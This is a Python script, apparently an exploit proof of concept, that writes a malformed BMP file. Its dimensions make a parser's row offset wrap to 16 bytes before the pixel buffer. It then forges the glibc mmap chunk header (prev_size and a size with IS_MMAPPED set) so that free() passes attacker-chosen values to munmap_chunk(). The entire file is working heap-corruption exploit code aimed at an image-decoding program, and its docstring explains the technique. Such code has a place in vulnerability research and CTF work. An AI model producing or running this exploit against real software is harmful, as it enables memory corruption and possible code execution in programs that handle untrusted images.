#!/usr/bin/env python3
"""Craft a BMP whose first wrapped row covers both glibc mmap chunk words.

Geometry w=8, h=0x0aaaaaaab, depth=24: y=h-1 and y*w*3 wrap to -16, so the
first row writes bytes at array-16..+7. The chunk header is prev_size at
array-16 (8 bytes) and size at array-8 (8 bytes), both in the mapped page.
One truncated row reaches free() without a wild write.

The file-derived 16 bytes placed at array-16..-1 are:
  prev_size=0x3000 (LE, 8 bytes) | size=0x0000000200001002 (LE)
The size keeps its IS_MMAPPED bit and page-aligned low bits so munmap_chunk()
can act on the crafted pair.
"""
import sys
from pathlib import Path

src = Path(sys.argv[1])
dst = Path(sys.argv[2])
raw = src.read_bytes()
assert len(raw) == 118 and raw[:2] == b"BM"
header = bytearray(raw[:54])
header[2:6] = (54 + 24).to_bytes(4, "little")
header[18:22] = (8).to_bytes(4, "little")
header[22:26] = (0x0AAAAAAB).to_bytes(4, "little")
header[34:38] = (24).to_bytes(4, "little")

target = ((0x3000).to_bytes(8, "little")
          + (0x0000000200001002).to_bytes(8, "little")
          + b"TAILPIX!")  # byte at array+7 is the one left unread
assert len(target) == 24
# Case 24 stores each pixel as ptr[2], ptr[1], ptr[0] = file b0, b1, b2.
pixel = b"".join(target[i:i + 3][::-1] for i in range(0, 24, 3))
dst.write_bytes(bytes(header) + pixel[:-1])
print(f"{dst} bytes={dst.stat().st_size} geometry w=8 h=0x0aaaaaaab depth=24")
print(f"target at array-16..-1 = {target.hex(' ')}")
